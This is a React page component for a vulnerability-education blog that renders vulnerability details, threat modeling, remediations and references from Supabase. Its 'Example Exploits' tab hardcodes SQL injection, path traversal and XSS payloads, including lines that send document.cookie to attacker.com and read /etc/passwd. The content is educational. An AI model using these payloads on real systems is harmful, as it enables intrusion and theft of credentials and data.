import React, { useState, useEffect } from 'react';
import { useNavigate, useParams } from 'react-router-dom';
import { supabase } from "@/integrations/supabase/client";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Separator } from '@/components/ui/separator';
import { ArrowLeft, AlertCircle, CheckCircle, BookOpen, Code } from 'lucide-react';
import BlogDetailSkeleton from '@/components/blog/BlogDetailSkeleton';
import { Button } from '@/components/ui/button';

interface Vulnerability {
  id: string;
  title: string;
  severity: string;
  risk_rating: string;
  description: string;
  technical_impact: string;
  business_impact: string;
  is_vulnerable: boolean;
  created_at: string;
}

interface ThreatModeling {
  id: string;
  vulnerability_id: string;
  exploitability: number;
  prevalence: number;
  detectability: number;
  technical_impact_score: number;
  business_impact_detail: string;
}

interface Remediation {
  id: string;
  vulnerability_id: string;
  recommendation: string;
  priority_level: string;
}

interface Reference {
  id: string;
  vulnerability_id: string;
  ref_type: string;
  ref_url: string;
  ref_title: string;
}

// Function to format date and time
const formatDate = (dateString: string) => {
  const date = new Date(dateString);
  return new Intl.DateTimeFormat('en-US', {
    year: 'numeric',
    month: 'long',
    day: 'numeric',
    hour: '2-digit',
    minute: '2-digit'
  }).format(date);
};

const Blog = () => {
  const { id } = useParams<{ id: string }>();
  const navigate = useNavigate();
  const [vulnerability, setVulnerability] = useState<Vulnerability | null>(null);
  const [threatModeling, setThreatModeling] = useState<ThreatModeling | null>(null);
  const [remediations, setRemediations] = useState<Remediation[]>([]);
  const [references, setReferences] = useState<Reference[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    const fetchBlogData = async () => {
      try {
        if (!id) {
          setError("Blog ID not provided");
          setLoading(false);
          return;
        }

        // Fetch the vulnerability
        const { data: vulnData, error: vulnError } = await supabase
          .from('vulnerabilities')
          .select('*')
          .eq('id', id)
          .single();

        if (vulnError) {
          throw vulnError;
        }

        setVulnerability(vulnData);

        // Fetch the threat modeling
        const { data: threatData, error: threatError } = await supabase
          .from('threat_modeling')
          .select('*')
          .eq('vulnerability_id', id)
          .single();

        if (!threatError) {
          setThreatModeling(threatData);
        }

        // Fetch remediations
        const { data: remData, error: remError } = await supabase
          .from('remediations')
          .select('*')
          .eq('vulnerability_id', id);

        if (!remError && remData) {
          setRemediations(remData);
        }

        // Fetch references
        const { data: refData, error: refError } = await supabase
          .from('references')
          .select('*')
          .eq('vulnerability_id', id);

        if (!refError && refData) {
          setReferences(refData);
        }
      } catch (err) {
        console.error("Error fetching blog data:", err);
        setError("An error occurred while retrieving blog data.");
      } finally {
        setLoading(false);
      }
    };

    fetchBlogData();
  }, [id]);

  const handleBack = () => navigate('/blog');

  // Example exploit/payload generation based on vulnerability type
  const getExampleExploit = () => {
    if (!vulnerability) return null;
    
    const title = vulnerability.title.toLowerCase();
    
    if (title.includes('sql injection')) {
      return {
        name: 'SQL Injection Example',
        description: 'This payload attempts to extract database information by injecting SQL commands.',
        examples: [
          {
            name: 'Basic Authentication Bypass',
            payload: `' OR 1=1 --`,
            explanation: 'This simple payload may bypass login forms by making the WHERE clause always evaluate to true.'
          },
          {
            name: 'Data Extraction',
            payload: `' UNION SELECT username, password FROM users --`,
            explanation: 'This payload attempts to extract username and password data from a users table.'
          },
          {
            name: 'Blind SQL Injection',
            payload: `' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a`,
            explanation: 'This payload tests if the first character of a username is "a" in a blind SQL injection scenario.'
          }
        ]
      };
    } else if (title.includes('xss') || title.includes('cross-site scripting')) {
      return {
        name: 'Cross-Site Scripting (XSS) Example',
        description: 'These payloads attempt to execute JavaScript in the victim\'s browser.',
        examples: [
          {
            name: 'Basic Alert',
            payload: `<script>alert('XSS')</script>`,
            explanation: 'A simple script that displays an alert box to verify XSS vulnerability.'
          },
          {
            name: 'Cookie Theft',
            payload: `<img src="x" onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">`,
            explanation: 'This payload attempts to send the victim\'s cookies to an attacker-controlled server.'
          },
          {
            name: 'DOM-based XSS',
            payload: `javascript:eval('fetch(\\'https://attacker.com/log?data=\\'+document.cookie)')`,
            explanation: 'A DOM-based XSS payload that executes when inserted into a javascript: URL.'
          }
        ]
      };
    } else if (title.includes('path traversal')) {
      return {
        name: 'Path Traversal Example',
        description: 'These payloads attempt to access files outside of the intended directory.',
        examples: [
          {
            name: 'Basic Path Traversal',
            payload: `../../../etc/passwd`,
            explanation: 'A simple path traversal to access the /etc/passwd file on Linux systems.'
          },
          {
            name: 'Encoded Traversal',
            payload: `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`,
            explanation: 'URL-encoded path traversal to bypass simple filters.'
          },
          {
            name: 'Windows Specific',
            payload: `..\\..\\..\\windows\\system32\\drivers\\etc\\hosts`,
            explanation: 'Path traversal targeting Windows hosts file.'
          }
        ]
      };
    }
    
    // Generic example for other vulnerability types
    return {
      name: 'Example Payload',
      description: 'Generic examples that might be applicable to this vulnerability type.',
      examples: [
        {
          name: 'Reconnaissance',
          payload: `Scanning with: nmap -sV -sC -p- target.com`,
          explanation: 'Comprehensive port scan to identify vulnerable services.'
        },
        {
          name: 'Parameter Manipulation',
          payload: `original_param=modified_value`,
          explanation: 'Modify request parameters to test for improper validation.'
        },
        {
          name: 'Error Triggering',
          payload: `value' OR extractvalue(rand(),concat(0x7e,(SELECT version()),0x7e))`,
          explanation: 'Attempts to trigger errors that might reveal system information.'
        }
      ]
    };
  };

  if (loading) return <BlogDetailSkeleton />;
  
  if (error || !vulnerability) {
    return (
      <div className="container mx-auto px-4 py-6">
        <Card>
          <CardHeader>
            <CardTitle className="flex items-center">
              <AlertCircle className="text-destructive mr-2 h-5 w-5" />
              Error
            </CardTitle>
            <CardDescription>
              {error || "Blog post not found."}
            </CardDescription>
          </CardHeader>
          <CardContent>
            <Button onClick={handleBack} variant="outline" size="sm" className="mt-4">
              <ArrowLeft className="mr-2 h-4 w-4" /> Back to Blog List
            </Button>
          </CardContent>
        </Card>
      </div>
    );
  }

  const exploitExample = getExampleExploit();

  return (
    <div className="container mx-auto px-4 py-6 max-w-6xl">
      <div className="space-y-6">
        <Button onClick={handleBack} variant="outline" size="sm">
          <ArrowLeft className="mr-2 h-4 w-4" /> Back to Blog List
        </Button>

        <div>
          <div className="flex items-center space-x-2 mb-2">
            <Badge className={`${vulnerability.severity === '高' ? 'bg-destructive' : vulnerability.severity === '中' ? 'bg-warning' : 'bg-success'}`}>
              {vulnerability.severity} Risk
            </Badge>
            <Badge variant="outline">{vulnerability.risk_rating}</Badge>
            <span className="text-sm text-muted-foreground">
              {formatDate(vulnerability.created_at)}
            </span>
          </div>
          <h1 className="text-3xl font-bold tracking-tight mb-2">
            {vulnerability.title}
          </h1>
        </div>

        <Tabs defaultValue="overview">
          <TabsList className="grid w-full grid-cols-5">
            <TabsTrigger value="overview">Overview</TabsTrigger>
            <TabsTrigger value="technical">Technical Details</TabsTrigger>
            <TabsTrigger value="exploit">Example Exploits</TabsTrigger>
            <TabsTrigger value="remediation">Remediation</TabsTrigger>
            <TabsTrigger value="resources">Resources</TabsTrigger>
          </TabsList>

          {/* Overview Tab */}
          <TabsContent value="overview" className="space-y-4 mt-4">
            <Card>
              <CardHeader>
                <CardTitle>Vulnerability Description</CardTitle>
              </CardHeader>
              <CardContent>
                <p className="whitespace-pre-wrap">{vulnerability.description}</p>
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle>Impact</CardTitle>
              </CardHeader>
              <CardContent className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <h3 className="text-lg font-medium mb-2">Technical Impact</h3>
                  <p>{vulnerability.technical_impact}</p>
                </div>
                <div>
                  <h3 className="text-lg font-medium mb-2">Business Impact</h3>
                  <p>{vulnerability.business_impact}</p>
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          {/* Technical Tab */}
          <TabsContent value="technical" className="space-y-4 mt-4">
            {threatModeling && (
              <Card>
                <CardHeader>
                  <CardTitle>Threat Modeling</CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                    <div className="space-y-2">
                      <h3 className="text-sm font-medium">Exploitability</h3>
                      <div className="flex space-x-1">
                        {Array(3).fill(0).map((_, i) => (
                          <span key={i} className={`w-4 h-4 rounded-full ${i < threatModeling.exploitability ? 'bg-destructive' : 'bg-muted'}`}></span>
                        ))}
                      </div>
                    </div>
                    
                    <div className="space-y-2">
                      <h3 className="text-sm font-medium">Prevalence</h3>
                      <div className="flex space-x-1">
                        {Array(3).fill(0).map((_, i) => (
                          <span key={i} className={`w-4 h-4 rounded-full ${i < threatModeling.prevalence ? 'bg-destructive' : 'bg-muted'}`}></span>
                        ))}
                      </div>
                    </div>
                    
                    <div className="space-y-2">
                      <h3 className="text-sm font-medium">Detectability</h3>
                      <div className="flex space-x-1">
                        {Array(3).fill(0).map((_, i) => (
                          <span key={i} className={`w-4 h-4 rounded-full ${i < threatModeling.detectability ? 'bg-destructive' : 'bg-muted'}`}></span>
                        ))}
                      </div>
                    </div>
                    
                    <div className="space-y-2">
                      <h3 className="text-sm font-medium">Technical Impact</h3>
                      <div className="flex space-x-1">
                        {Array(3).fill(0).map((_, i) => (
                          <span key={i} className={`w-4 h-4 rounded-full ${i < threatModeling.technical_impact_score ? 'bg-destructive' : 'bg-muted'}`}></span>
                        ))}
                      </div>
                    </div>
                  </div>
                  
                  <Separator />
                  
                  <div className="pt-2">
                    <h3 className="text-lg font-medium mb-2">Business Impact Details</h3>
                    <p>{threatModeling.business_impact_detail}</p>
                  </div>
                </CardContent>
              </Card>
            )}
          </TabsContent>

          {/* Example Exploits Tab */}
          <TabsContent value="exploit" className="mt-4">
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center">
                  <Code className="mr-2 h-5 w-5 text-destructive" />
                  Example Exploits & Payloads
                </CardTitle>
                <CardDescription>
                  These examples demonstrate how this vulnerability might be exploited.
                  <strong className="block mt-1 text-destructive">For educational purposes only. Do not use against systems without authorization.</strong>
                </CardDescription>
              </CardHeader>
              <CardContent>
                {exploitExample ? (
                  <div className="space-y-6">
                    <p>{exploitExample.description}</p>
                    
                    {exploitExample.examples.map((example, i) => (
                      <div key={i} className="bg-muted/50 rounded-lg p-4 border border-border">
                        <h3 className="text-lg font-medium mb-2">{example.name}</h3>
                        <div className="bg-background font-mono text-sm p-3 rounded border border-border mb-3 overflow-x-auto">
                          <code>{example.payload}</code>
                        </div>
                        <p className="text-sm text-muted-foreground">{example.explanation}</p>
                      </div>
                    ))}
                  </div>
                ) : (
                  <p className="text-muted-foreground">No example exploits available for this vulnerability type.</p>
                )}
              </CardContent>
            </Card>
          </TabsContent>

          {/* Remediation Tab */}
          <TabsContent value="remediation" className="mt-4">
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center">
                  <CheckCircle className="mr-2 h-5 w-5 text-green-500" />
                  Recommended Measures
                </CardTitle>
                <CardDescription>Recommendations to fix this vulnerability</CardDescription>
              </CardHeader>
              <CardContent>
                {remediations.length === 0 ? (
                  <p className="text-muted-foreground">No remediation information available.</p>
                ) : (
                  <div className="space-y-6">
                    {remediations.map((remediation, index) => {
                      // Determine badge variant based on priority level
                      const badgeVariant = 
                        remediation.priority_level === "必須" ? "destructive" : 
                        remediation.priority_level === "推奨" ? "default" : "outline";
                      
                      // Convert priority level to English
                      const priorityText = 
                        remediation.priority_level === "必須" ? "Critical" : 
                        remediation.priority_level === "推奨" ? "Recommended" : "Optional";
                      
                      return (
                        <div key={remediation.id} className={index > 0 ? "pt-6 border-t" : ""}>
                          <div className="flex justify-between items-start mb-3">
                            <h3 className="font-medium text-lg">{index + 1}. Recommendation</h3>
                            <Badge variant={badgeVariant} className="ml-2">
                              {priorityText}
                            </Badge>
                          </div>
                          <div className="mb-3 px-4 py-3 bg-card border rounded-md">
                            <p className="whitespace-pre-wrap">{remediation.recommendation}</p>
                          </div>
                        </div>
                      );
                    })}
                  </div>
                )}
              </CardContent>
            </Card>
          </TabsContent>

          {/* Resources Tab */}
          <TabsContent value="resources" className="mt-4">
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center">
                  <BookOpen className="mr-2 h-5 w-5" />
                  References and Resources
                </CardTitle>
                <CardDescription>Links to additional information about this vulnerability</CardDescription>
              </CardHeader>
              <CardContent>
                {references.length === 0 ? (
                  <p className="text-muted-foreground">No references available.</p>
                ) : (
                  <div className="space-y-4">
                    {references.map((reference) => (
                      <div key={reference.id} className="flex items-start">
                        <Badge variant="outline" className="mr-2 mt-0.5">{reference.ref_type}</Badge>
                        <div>
                          <a href={reference.ref_url} 
                             target="_blank" 
                             rel="noopener noreferrer"
                             className="text-primary hover:underline">
                            {reference.ref_title || reference.ref_url}
                          </a>
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  );
};

export default Blog;
